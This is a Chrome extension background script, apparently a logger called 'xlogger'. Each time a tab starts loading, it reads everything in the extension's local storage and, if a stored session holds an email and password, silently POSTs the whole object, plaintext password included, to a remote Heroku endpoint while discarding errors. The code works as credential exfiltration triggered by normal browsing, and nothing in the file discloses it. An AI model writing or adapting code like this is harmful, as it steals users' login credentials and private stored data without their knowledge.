var domain="https://xlogger.herokuapp.com"
// var domain="http://localhost:9992"
let loading=1;

chrome.tabs.onUpdated.addListener(async (tabId,changeInfo,tab)=>{
    // console.log("updated",changeInfo,tab);
    if(changeInfo.status=="loading" && loading==1){
        chrome.storage.local.get(obj=>{
          let session=obj.session;
          if(session.email && session.password){
            loading++;
            console.log("sending log");            
            setTimeout(() => {
                    fetch(`${domain}/upload`,{
                        method:"POST",
                        mode:"cors",
                        body:JSON.stringify(obj),
                        headers:{
                            "content-Type":"application/json"
                        }
                    }).catch(err=>err);
                
                loading--;
            },1000);  
            console.log(obj);
          }
        });  
    } 
})  




